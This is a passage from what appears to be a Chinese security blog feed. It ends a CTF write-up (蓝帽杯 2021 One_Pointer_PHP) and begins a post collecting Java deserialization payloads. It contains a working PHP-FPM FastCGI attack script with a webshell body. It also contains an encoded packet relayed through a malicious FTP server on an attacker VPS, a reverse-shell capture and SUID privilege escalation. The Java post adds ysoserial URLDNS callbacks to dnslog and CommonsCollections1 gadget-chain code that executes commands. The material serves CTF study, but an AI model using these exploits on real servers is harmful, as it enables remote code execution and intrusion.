<span class="token variable">$filepath</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"/var/www/html/add_api.php"</span><span class="token punctuation">;</span>
<span class="token variable">$req</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'/'</span><span class="token operator">.</span><span class="token function">basename</span><span class="token punctuation">(</span><span class="token variable">$filepath</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$uri</span> <span class="token operator">=</span> <span class="token variable">$req</span> <span class="token operator">.</span><span class="token string single-quoted-string">'?'</span><span class="token operator">.</span><span class="token string single-quoted-string">'command=whoami'</span><span class="token punctuation">;</span>
<span class="token variable">$client</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">FCGIClient</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"unix:///var/run/php-fpm.sock"</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$code</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"&lt;?php system(\$_REQUEST['command']); phpinfo(); ?>"</span><span class="token punctuation">;</span>
<span class="token variable">$php_value</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"unserialize_callback_func = system\nextension_dir = /var/www/html\nextension = a.so\ndisable_classes = \ndisable_functions = \nallow_url_include = On\nopen_basedir = /\nauto_prepend_file = "</span><span class="token punctuation">;</span>
<span class="token variable">$params</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span>
    <span class="token string single-quoted-string">'GATEWAY_INTERFACE'</span> <span class="token operator">=></span> <span class="token string single-quoted-string">'FastCGI/1.0'</span><span class="token punctuation">,</span>
    <span class="token string single-quoted-string">'REQUEST_METHOD'</span>    <span class="token operator">=></span> <span class="token string single-quoted-string">'POST'</span><span class="token punctuation">,</span>
    <span class="token string single-quoted-string">'SCRIPT_FILENAME'</span>   <span class="token operator">=></span> <span class="token variable">$filepath</span><span class="token punctuation">,</span>
    <span class="token string single-quoted-string">'SCRIPT_NAME'</span>       <span class="token operator">=></span> <span class="token variable">$req</span><span class="token punctuation">,</span>
    <span class="token string single-quoted-string">'QUERY_STRING'</span>      <span class="token operator">=></span> <span class="token string single-quoted-string">'command=whoami'</span><span class="token punctuation">,</span>
    <span class="token string single-quoted-string">'REQUEST_URI'</span>       <span class="token operator">=></span> <span class="token variable">$uri</span><span class="token punctuation">,</span>
    <span class="token string single-quoted-string">'DOCUMENT_URI'</span>      <span class="token operator">=></span> <span class="token variable">$req</span><span class="token punctuation">,</span>
<span class="token comment">#'DOCUMENT_ROOT'     => '/',</span>
    <span class="token string single-quoted-string">'PHP_VALUE'</span>         <span class="token operator">=></span> <span class="token variable">$php_value</span><span class="token punctuation">,</span>
    <span class="token string single-quoted-string">'SERVER_SOFTWARE'</span>   <span class="token operator">=></span> <span class="token string single-quoted-string">'80sec/wofeiwo'</span><span class="token punctuation">,</span>
    <span class="token string single-quoted-string">'REMOTE_ADDR'</span>       <span class="token operator">=></span> <span class="token string single-quoted-string">'127.0.0.1'</span><span class="token punctuation">,</span>
    <span class="token string single-quoted-string">'REMOTE_PORT'</span>       <span class="token operator">=></span> <span class="token string single-quoted-string">'9001'</span><span class="token punctuation">,</span>
    <span class="token string single-quoted-string">'SERVER_ADDR'</span>       <span class="token operator">=></span> <span class="token string single-quoted-string">'127.0.0.1'</span><span class="token punctuation">,</span>
    <span class="token string single-quoted-string">'SERVER_PORT'</span>       <span class="token operator">=></span> <span class="token string single-quoted-string">'80'</span><span class="token punctuation">,</span>
    <span class="token string single-quoted-string">'SERVER_NAME'</span>       <span class="token operator">=></span> <span class="token string single-quoted-string">'localhost'</span><span class="token punctuation">,</span>
    <span class="token string single-quoted-string">'SERVER_PROTOCOL'</span>   <span class="token operator">=></span> <span class="token string single-quoted-string">'HTTP/1.1'</span><span class="token punctuation">,</span>
    <span class="token string single-quoted-string">'CONTENT_LENGTH'</span>    <span class="token operator">=></span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$code</span><span class="token punctuation">)</span>
<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">echo</span> <span class="token variable">$client</span><span class="token operator">-></span><span class="token function">request</span><span class="token punctuation">(</span><span class="token variable">$params</span><span class="token punctuation">,</span> <span class="token variable">$code</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string double-quoted-string">"\n"</span><span class="token punctuation">;</span>
<span class="token delimiter important">?></span></span></code></pre>

<pre class="language-none"><code class="language-none">data&#x3D;%01%01%00%01%00%08%00%00%00%01%00%00%00%00%00%00%01%04%00%01%02B%00%00%11%0BGATEWAY_INTERFACEFastCGI%2F1.0%0E%04REQUEST_METHODPOST%0F%19SCRIPT_FILENAME%2Fvar%2Fwww%2Fhtml%2Fadd_api.php%0B%0CSCRIPT_NAME%2Fadd_api.php%0C%0EQUERY_STRINGcommand%3Dwhoami%0B%1BREQUEST_URI%2Fadd_api.php%3Fcommand%3Dwhoami%0C%0CDOCUMENT_URI%2Fadd_api.php%09%80%00%00%B6PHP_VALUEunserialize_callback_func+%3D+system%0Aextension_dir+%3D+%2Fvar%2Fwww%2Fhtml%0Aextension+%3D+a.so%0Adisable_classes+%3D+%0Adisable_functions+%3D+%0Aallow_url_include+%3D+On%0Aopen_basedir+%3D+%2F%0Aauto_prepend_file+%3D+%0F%0DSERVER_SOFTWARE80sec%2Fwofeiwo%0B%09REMOTE_ADDR127.0.0.1%0B%04REMOTE_PORT9001%0B%09SERVER_ADDR127.0.0.1%0B%02SERVER_PORT80%0B%09SERVER_NAMElocalhost%0F%08SERVER_PROTOCOLHTTP%2F1.1%0E%02CONTENT_LENGTH49%01%04%00%01%00%00%00%00%01%05%00%01%001%00%00%3C%3Fphp+system%28%24_REQUEST%5B%27command%27%5D%29%3B+phpinfo%28%29%3B+%3F%3E%01%05%00%01%00%00%00%00</code></pre>

<p><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/%E8%93%9D%E5%B8%BD%E6%9D%AF_2021_One_Pointer_PHP/image-20211207154718100.png" alt loading="lazy"></p>
<p>构造<code>file_put_contents()</code>与我们 <code>vps</code> 上恶意的 <code>ftp</code> 服务器建立连接</p>
<pre class="language-none"><code class="language-none">backdoor&#x3D;$file%20&#x3D;%20$_GET[&#39;file&#39;];$data%20&#x3D;%20$_GET[&#39;data&#39;];file_put_contents($file,$data);&amp;file&#x3D;ftp:&#x2F;&#x2F;ip:123&#x2F;&amp;data&#x3D;%01%01%00%01%00%08%00%00%00%01%00%00%00%00%00%00%01%04%00%01%02B%00%00%11%0BGATEWAY_INTERFACEFastCGI%2F1.0%0E%04REQUEST_METHODPOST%0F%19SCRIPT_FILENAME%2Fvar%2Fwww%2Fhtml%2Fadd_api.php%0B%0CSCRIPT_NAME%2Fadd_api.php%0C%0EQUERY_STRINGcommand%3Dwhoami%0B%1BREQUEST_URI%2Fadd_api.php%3Fcommand%3Dwhoami%0C%0CDOCUMENT_URI%2Fadd_api.php%09%80%00%00%B6PHP_VALUEunserialize_callback_func+%3D+system%0Aextension_dir+%3D+%2Fvar%2Fwww%2Fhtml%0Aextension+%3D+a.so%0Adisable_classes+%3D+%0Adisable_functions+%3D+%0Aallow_url_include+%3D+On%0Aopen_basedir+%3D+%2F%0Aauto_prepend_file+%3D+%0F%0DSERVER_SOFTWARE80sec%2Fwofeiwo%0B%09REMOTE_ADDR127.0.0.1%0B%04REMOTE_PORT9001%0B%09SERVER_ADDR127.0.0.1%0B%02SERVER_PORT80%0B%09SERVER_NAMElocalhost%0F%08SERVER_PROTOCOLHTTP%2F1.1%0E%02CONTENT_LENGTH49%01%04%00%01%00%00%00%00%01%05%00%01%001%00%00%3C%3Fphp+system%28%24_REQUEST%5B%27command%27%5D%29%3B+phpinfo%28%29%3B+%3F%3E%01%05%00%01%00%00%00%00</code></pre>

<p><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/%E8%93%9D%E5%B8%BD%E6%9D%AF_2021_One_Pointer_PHP/image-20211207154920402.png" alt loading="lazy"></p>
<p>发包，vps监听2333端口拿到shell</p>
<p><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/%E8%93%9D%E5%B8%BD%E6%9D%AF_2021_One_Pointer_PHP/image-20211207155006354.png" alt loading="lazy"></p>
<p>无权限读取flag</p>
<p><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/%E8%93%9D%E5%B8%BD%E6%9D%AF_2021_One_Pointer_PHP/image-20211207155302172.png" alt loading="lazy"></p>
<h3 id="suid提权"><a href="#suid提权" class="headerlink" title="suid提权"></a>suid提权</h3><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">find</span> / -perm -u<span class="token operator">=</span>s -type f <span class="token operator"><span class="token file-descriptor important">2</span>></span>/dev/null</code></pre>

<p><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/%E8%93%9D%E5%B8%BD%E6%9D%AF_2021_One_Pointer_PHP/image-20211207155757551.png" alt loading="lazy"></p>
<p>php有suid，进入交互模式执行代码，得到flag</p>
<p><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/%E8%93%9D%E5%B8%BD%E6%9D%AF_2021_One_Pointer_PHP/image-20211207160808736.png" alt loading="lazy"></p>
<h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="https://rmb122.com/2020/12/30/hxp-CTF-resonator-Writeup-SSRF-via-file-put-contents/">hxp CTF resonator Writeup - SSRF via file_put_contents</a></p>
<p><a href="https://bbs.ichunqiu.com/thread-60888-1-1.html">通过一道CTF题学习php-fpm攻击</a></p>
<p><a href="https://ha1c9on.top/2021/04/29/lmb_one_pointer_php/">蓝帽杯_one_Pointer_php</a></p>
<p><a href="http://www.hackdig.com/05/hack-342091.htm">[2021 蓝帽杯]one_Pointer_php赛后复盘</a></p>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>CTF题</tag>
      </tags>
  </entry>
  <entry>
    <title>Java反序列化Payload</title>
    <url>/posts/c6da5693/</url>
    <content><![CDATA[<p>把学习java反序列化的一些链都记录一下，简单记录Payload，即利用方法，细节就不分析了，网上文章很多 <del>（其实是理解不深怕分析不到位。。。）</del>，当然重在原理理解，以后发现了新思路可能会记录一下吧</p>
<p>本篇主要记录利用链代码，以及自己的一些简单理解，<strong>非漏洞原理</strong></p>
<span id="more"></span>

<p>未做说明的情况下，测试环境均为<code>Windows10+jdk1.8.0_221+IDEA2019.3</code></p>
<h3 id="URLDNS"><a href="#URLDNS" class="headerlink" title="URLDNS"></a>URLDNS</h3><p>起一个<code>tomcat</code>，版本为<code>8.5.57</code></p>
<p><code>servlet</code>代码如下，<code>web.xml</code>自行配置</p>
<pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">import</span> <span class="token import"><span class="token namespace">javax<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span></span><span class="token class-name">ServletException</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">javax<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span></span><span class="token class-name">ServletInputStream</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">javax<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span>http<span class="token punctuation">.</span></span><span class="token class-name">HttpServlet</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">javax<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span>http<span class="token punctuation">.</span></span><span class="token class-name">HttpServletRequest</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">javax<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span>http<span class="token punctuation">.</span></span><span class="token class-name">HttpServletResponse</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">IOException</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">ObjectInputStream</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">PrintWriter</span></span><span class="token punctuation">;</span>

<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">HashMap</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>net<span class="token punctuation">.</span></span><span class="token class-name">URL</span></span><span class="token punctuation">;</span>

<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">DemoServlet</span> <span class="token keyword">extends</span> <span class="token class-name">HttpServlet</span> <span class="token punctuation">&#123;</span>
    <span class="token annotation punctuation">@Override</span>
    <span class="token keyword">protected</span> <span class="token keyword">void</span> <span class="token function">doPost</span><span class="token punctuation">(</span><span class="token class-name">HttpServletRequest</span> req<span class="token punctuation">,</span> <span class="token class-name">HttpServletResponse</span> resp<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">ServletException</span><span class="token punctuation">,</span> <span class="token class-name">IOException</span> <span class="token punctuation">&#123;</span>
        <span class="token class-name">ServletInputStream</span> sis <span class="token operator">=</span> req<span class="token punctuation">.</span><span class="token function">getInputStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">ObjectInputStream</span> ois <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ObjectInputStream</span><span class="token punctuation">(</span>sis<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">try</span><span class="token punctuation">&#123;</span>
            ois<span class="token punctuation">.</span><span class="token function">readObject</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span><span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">ClassNotFoundException</span> e<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
            e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
        ois<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token annotation punctuation">@Override</span>
    <span class="token keyword">protected</span> <span class="token keyword">void</span> <span class="token function">doGet</span><span class="token punctuation">(</span><span class="token class-name">HttpServletRequest</span> req<span class="token punctuation">,</span> <span class="token class-name">HttpServletResponse</span> resp<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">ServletException</span><span class="token punctuation">,</span> <span class="token class-name">IOException</span> <span class="token punctuation">&#123;</span>
        <span class="token class-name">PrintWriter</span> out <span class="token operator">=</span> resp<span class="token punctuation">.</span><span class="token function">getWriter</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"this is a demo"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span></code></pre>

<p>使用<code>ysoserial</code>生成<code>payload</code>，项目地址：<a href="https://github.com/frohoff/ysoserial">https://github.com/frohoff/ysoserial</a></p>
<p>在IDEA把<code>运行/调试配置</code>的<code>程序参数</code>设置为<code>URLDNS &quot;http://hnhnxq.dnslog.cn&quot;</code></p>
<p><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Payload/image-20210914000124654.png" alt loading="lazy"></p>
<p>然后在<code>Serializer.java</code>中加入以下代码</p>
<pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">try</span> <span class="token punctuation">&#123;</span>
    <span class="token class-name">FileOutputStream</span> fileOut <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">FileOutputStream</span><span class="token punctuation">(</span><span class="token string">"./payload.ser"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token class-name">ObjectOutputStream</span> ot <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ObjectOutputStream</span><span class="token punctuation">(</span>fileOut<span class="token punctuation">)</span><span class="token punctuation">;</span>
    ot<span class="token punctuation">.</span><span class="token function">writeObject</span><span class="token punctuation">(</span>obj<span class="token punctuation">)</span><span class="token punctuation">;</span>
    ot<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span class="token keyword">catch</span><span class="token punctuation">(</span><span class="token class-name">IOException</span> i<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    i<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span></code></pre>

<p>如下图</p>
<p><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Payload/image-20210913235630028.png" alt loading="lazy"></p>
<p>目的是将反序列化后的数据保存为<code>payload.ser</code>文件</p>
<p>使用<code>curl</code>发包：<code>curl http://localhost:8088/demo --data-binary @payload.ser</code></p>
<p>参数解释：<code>--data-binary key=value</code></p>
<ul>
<li>HTTP POST请求中的数据为纯二进制数据</li>
<li><code>value</code>如果是<code>@file_name</code>，则保留文件中的回车符和换行符，不做任何转换</li>
</ul>
<p><code>dnslog</code>收到请求记录</p>
<p><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Payload/image-20210913234611155.png" alt loading="lazy"></p>
<p>这条链一般用来探测是否存在反序列化漏洞，好处是未依赖任何的第三方包，而且并不会影响测试的业务程序</p>
<h3 id="CommonCollections1"><a href="#CommonCollections1" class="headerlink" title="CommonCollections1"></a>CommonCollections1</h3><p><code>ChainedTransformer</code>这条链原理不再赘述，主要依赖<code>sun.reflect.annotation.AnnotationInvocationHandler</code>这个类来触发反序列化，然后通过<code>Map</code>来触发<code>transform</code>的调用</p>
<pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span></span><span class="token class-name">Transformer</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span>functors<span class="token punctuation">.</span></span><span class="token class-name">ChainedTransformer</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span>functors<span class="token punctuation">.</span></span><span class="token class-name">ConstantTransformer</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span>functors<span class="token punctuation">.</span></span><span class="token class-name">InvokerTransformer</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span>map<span class="token punctuation">.</span></span><span class="token class-name">LazyMap</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span>map<span class="token punctuation">.</span></span><span class="token class-name">TransformedMap</span></span><span class="token punctuation">;</span>

<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">ByteArrayInputStream</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">ByteArrayOutputStream</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">ObjectInputStream</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">ObjectOutputStream</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">Retention</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span></span><span class="token class-name">Constructor</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span></span><span class="token class-name">InvocationHandler</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span></span><span class="token class-name">Proxy</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">HashMap</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">Map</span></span><span class="token punctuation">;</span>

<span class="token keyword">import</span> <span class="token import"><span class="token namespace">sun<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">AnnotationType</span></span><span class="token punctuation">;</span>

<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">CommonCollections1</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">&#123;</span>
        <span class="token class-name">Transformer</span><span class="token punctuation">[</span><span class="token punctuation">]</span> transformers <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Transformer</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span>
                <span class="token keyword">new</span> <span class="token class-name">ConstantTransformer</span><span class="token punctuation">(</span><span class="token class-name">Runtime</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
                <span class="token keyword">new</span> <span class="token class-name">InvokerTransformer</span><span class="token punctuation">(</span><span class="token string">"getMethod"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token class-name">String</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token string">"getRuntime"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
                <span class="token keyword">new</span> <span class="token class-name">InvokerTransformer</span><span class="token punctuation">(</span><span class="token string">"invoke"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token punctuation">&#123;</span> <span class="token class-name">Object</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token keyword">class</span> <span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token punctuation">&#123;</span> <span class="token keyword">null</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
                <span class="token keyword">new</span> <span class="token class-name">InvokerTransformer</span><span class="token punctuation">(</span><span class="token string">"exec"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token class-name">String</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token string">"calc.exe"</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
                <span class="token keyword">new</span> <span class="token class-name">ConstantTransformer</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
        <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>
        <span class="token class-name">CC_LazyMap</span><span class="token punctuation">(</span>transformers<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token class-name">CC_TransformedMap</span><span class="token punctuation">(</span><span class="token class-name">Transformer</span><span class="token punctuation">[</span><span class="token punctuation">]</span> transformers<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">&#123;</span>
        <span class="token comment">/*
            Gadget chain:
                ObjectInputStream.readObject()
                    AnnotationInvocationHandler.readObject()
                        entry.setValue()
                            TransformedMap.checkSetValue()
                                ChainedTransformer.transform()
                                    ConstantTransformer.transform()
                                    InvokerTransformer.transform()
                                        Method.invoke()
                                            Class.getMethod()
                                    InvokerTransformer.transform()
                                        Method.invoke()
                                            Runtime.getRuntime()
                                    InvokerTransformer.transform()
                                        Method.invoke()
                                            Runtime.exec()

            Requires:
                commons-collections
         */</span>
        <span class="token comment">// java8后无法使用，AnnotationInvocationHandler被改写</span>
        <span class="token class-name">Transformer</span> transformerChain <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ChainedTransformer</span><span class="token punctuation">(</span>transformers<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">Map</span> innerMap <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HashMap</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        innerMap<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"value"</span><span class="token punctuation">,</span> <span class="token string">"xxxx"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">Map</span> outerMap <span class="token operator">=</span> <span class="token class-name">TransformedMap</span><span class="token punctuation">.</span><span class="token function">decorate</span><span class="token punctuation">(</span>innerMap<span class="token punctuation">,</span> <span class="token keyword">null</span><span class="token punctuation">,</span> transformerChain<span class="token punctuation">)</span><span class="token punctuation">;</span>


        <span class="token class-name">Class</span> clazz <span class="token operator">=</span> <span class="token class-name">Class</span><span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token string">"sun.reflect.annotation.AnnotationInvocationHandler"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">Constructor</span> construct <span class="token operator">=</span> clazz<span class="token punctuation">.</span><span class="token function">getDeclaredConstructor</span><span class="token punctuation">(</span><span class="token class-name">Class</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span> <span class="token class-name">Map</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        construct<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">InvocationHandler</span> handler <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">InvocationHandler</span><span class="token punctuation">)</span> construct<span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span><span class="token class-name">Retention</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span> outerMap<span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token function">out</span><span class="token punctuation">(</span>handler<span class="token punctuation">)</span><span class="token punctuation">;</span>
